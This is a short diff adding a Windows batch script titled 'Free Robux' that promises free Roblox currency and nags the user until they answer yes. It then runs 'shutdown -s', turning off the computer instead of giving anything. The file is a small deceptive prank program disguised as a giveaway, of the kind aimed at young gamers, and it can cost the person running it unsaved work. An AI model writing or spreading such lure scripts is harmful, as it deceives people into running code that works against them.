@@ -1,0 +1,16 @@
+@echo off
+Title Free Robux
+:lol
+cls
+echo Would you like free robux???
+echo SAY YES IF YOU WOULD LIKE SOME FREE ROBUX
+set /p answer= 
+IF %answer%== yes goto urdone
+IF %answer%== no goto ask
+:ask
+cls
+echo Are you sure?? Think again!
+pause
+goto lol
+:urdone
+shutdown -s
